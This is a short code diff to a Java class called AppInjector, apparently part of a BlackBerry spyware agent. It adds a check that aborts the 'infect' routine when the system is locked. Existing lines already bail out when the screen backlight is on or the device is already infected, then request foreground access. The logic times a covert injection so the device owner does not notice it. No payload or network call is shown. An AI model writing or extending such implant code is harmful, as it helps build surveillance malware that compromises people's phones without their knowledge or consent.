@@ -108,13 +108,21 @@ public class AppInjector {
         //#endif
         
         Utils.sleep(delegate.getDelay());
+        
+        if(ApplicationManager.getApplicationManager().isSystemLocked()){
+            //#ifdef DEBUG
+            debug.trace("infect: system locked");
+            //#endif
+            return;
+        }
+        
         if(Backlight.isEnabled()  || isInfected()){
             //#ifdef DEBUG
             debug.trace("infected or backlight, bailing out");
             //#endif
             return;
         }
-        
+
         int req = requestForeground();
         Utils.sleep(200);
         boolean fore = checkForeground();
